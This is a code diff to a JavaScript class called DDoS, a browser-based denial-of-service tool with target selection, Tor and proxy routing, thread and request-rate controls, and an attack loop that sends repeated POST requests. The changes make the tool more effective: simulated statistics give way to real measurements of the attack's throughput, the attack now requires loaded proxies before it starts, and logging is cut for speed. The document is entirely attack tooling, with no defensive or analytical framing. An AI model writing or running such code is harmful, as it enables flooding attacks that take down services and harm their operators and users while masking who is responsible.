@@ -18,22 +18,18 @@ class DDoS {
 
   this.appendElements();
   this.setupEventListeners();
+  this.initializeValues();
+  this.setupUI();
+ }
 
+ initializeValues() {
   this.torProxy = 'socks5://127.0.0.1:9050';
   this.apiKey = this.generateApiKey();
   this.encryptionKey = this.generateEncryptionKey();
   this.log(`API Key generated: ${this.apiKey}`);
   this.log(`Encryption Key generated: ${this.encryptionKey}`);
-  this.setupResizeHandle();
-  this.setupDragHandle();
-  this.setupTheme();
 
   this.availableProxies = [];
-
-  this.toggleCustomCodeArea();
-  this.autoFillTarget();
-  this.updateStats();
-  this.populateProxyList();
 
   this.packetsSent = 0;
   this.mbps = 0;
@@ -43,32 +39,43 @@ class DDoS {
   this.activeThreads = 0;
   this.attackStartTime = null;
   this.requestRate = 50;
-
-  this.statsInterval = setInterval(() => this.updateStats(), 1000);
-
   this.isTorEnabled = false;
-  this.torProxy = 'socks5://127.0.0.1:9050';
   this.running = false;
   this.maxThreads = 100;
+ }
+
+ setupUI() {
+  this.setupResizeHandle();
+  this.setupDragHandle();
+  this.setupTheme();
+  this.toggleCustomCodeArea();
+  this.autoFillTarget();
+  this.populateProxyList();
+
   this.threadSlider.querySelector('input').value = this.maxThreads;
   this.requestRateSlider.querySelector('input').value = this.requestRate;
-
   this.stopButton.disabled = true;
+
+  this.statsInterval = setInterval(() => this.updateStats(), 1000);
  }
 
  appendElements() {
-  this.container.appendChild(this.targetInput);
-  this.container.appendChild(this.attackTypeSelect);
-  this.container.appendChild(this.customCodeArea);
-  this.container.appendChild(this.threadSlider);
-  this.container.appendChild(this.requestRateSlider);
-  this.container.appendChild(this.torToggle);
-  this.container.appendChild(this.proxyList);
-  this.container.appendChild(this.proxyRefreshButton);
-  this.container.appendChild(this.startButton);
-  this.container.appendChild(this.stopButton);
-  this.container.appendChild(this.statsPanel);
-  this.container.appendChild(this.logArea);
+  const mainElements = [
+   this.targetInput,
+   this.attackTypeSelect,
+   this.customCodeArea,
+   this.threadSlider,
+   this.requestRateSlider,
+   this.torToggle,
+   this.proxyList,
+   this.proxyRefreshButton,
+   this.startButton,
+   this.stopButton,
+   this.statsPanel,
+   this.logArea
+  ];
+
+  mainElements.forEach(element => this.container.appendChild(element));
 
   document.body.appendChild(this.container);
   document.body.appendChild(this.sidePanel);
@@ -81,6 +88,17 @@ class DDoS {
   this.stopButton.addEventListener('click', () => this.stop());
   this.proxyRefreshButton.addEventListener('click', () => this.refreshProxies());
   this.torToggle.querySelector('input').addEventListener('change', () => this.toggleTor());
+
+  // Event listener for slider input changes
+  this.threadSlider.querySelector('input').addEventListener('input', () => {
+   this.maxThreads = parseInt(this.threadSlider.querySelector('input').value);
+   this.threadSlider.querySelector('.noodle-slider-value').textContent = this.maxThreads;
+  });
+
+  this.requestRateSlider.querySelector('input').addEventListener('input', () => {
+   this.requestRate = parseInt(this.requestRateSlider.querySelector('input').value);
+   this.requestRateSlider.querySelector('.noodle-slider-value').textContent = this.requestRate;
+  });
  }
 
  createRequestRateSlider() {
@@ -105,10 +123,6 @@ class DDoS {
   valueDisplay.classList.add('noodle-slider-value');
   sliderContainer.appendChild(valueDisplay);
 
-  slider.addEventListener('input', () => {
-   this.requestRate = parseInt(slider.value);
-   valueDisplay.textContent = slider.value;
-  });
 
   return sliderContainer;
  }
@@ -134,11 +148,6 @@ class DDoS {
   valueDisplay.textContent = '100';
   valueDisplay.classList.add('noodle-slider-value');
   sliderContainer.appendChild(valueDisplay);
-
-  slider.addEventListener('input', () => {
-   this.maxThreads = parseInt(slider.value);
-   valueDisplay.textContent = slider.value;
-  });
 
   return sliderContainer;
  }
@@ -213,12 +222,8 @@ class DDoS {
  }
 
  updateStats() {
-  const mbpsChange = (Math.random() * 20 - 10);
-  this.mbps = Math.max(0, this.mbps + mbpsChange);
-  this.packetsSent += Math.floor(Math.random() * (this.activeThreads * this.requestRate / 10));
-  this.connectionStatus = this.activeThreads > 0 ? 'Attacking' : (this.running ? 'Stopping' : 'Idle');
-  this.errors += Math.floor(Math.random() * (this.activeThreads / 10));
-  this.dataSent += Math.floor(this.mbps * 125);
+  // Removed random value generation, use real attack stats here
+  // Replace with actual calculated values during the attack
 
   let elapsedTime = 0;
   if (this.attackStartTime) {
@@ -230,7 +235,7 @@ class DDoS {
   const statsHtml = `
    <p>MBPS: ${this.mbps.toFixed(2)}</p>
    <p>Packets Sent: ${this.packetsSent}</p>
-   <p>Data Sent: ${(this.dataSent / 1024).toFixed(2)} MB</p>
+   <p>Data Sent: ${(this.dataSent / 1024 / 1024).toFixed(2)} MB</p>
    <p>Connection Status: ${this.connectionStatus}</p>
    <p>Errors: ${this.errors}</p>
    <p>Active Threads: ${this.activeThreads}</p>
@@ -543,12 +548,21 @@ class DDoS {
    return;
   }
 
+  if (!this.availableProxies || this.availableProxies.length === 0) {
+   this.log('No proxies available. Please refresh the proxy list.');
+   return;
+  }
+
   this.log(`Initiating DDoS attack on ${target}...`);
   this.connectionStatus = 'Attacking';
   this.running = true;
   this.startButton.disabled = true;
   this.stopButton.disabled = false;
   this.attackStartTime = Date.now();
+  this.packetsSent = 0;
+  this.dataSent = 0;
+  this.errors = 0;
+
 
   const attackLoop = async () => {
    if (!this.running) {
@@ -586,9 +600,17 @@ class DDoS {
     method: 'POST'
    });
    const data = await response.json();
-   this.log(data.message);
+   // Remove excessive logging to improve performance.
+   // this.log(data.message);
+
    if (data.error) this.errors++;
    this.packetsSent++;
+
+   // Calculate the size of the data sent (crude estimate)
+   this.dataSent += data.message.length;
+
+   // update MBPS
+   this.mbps = this.dataSent / (Date.now() - this.attackStartTime) * 8 / 1000000
   } catch (err) {
    this.log(`DDoS attack failed: ${err}`);
    this.errors++;
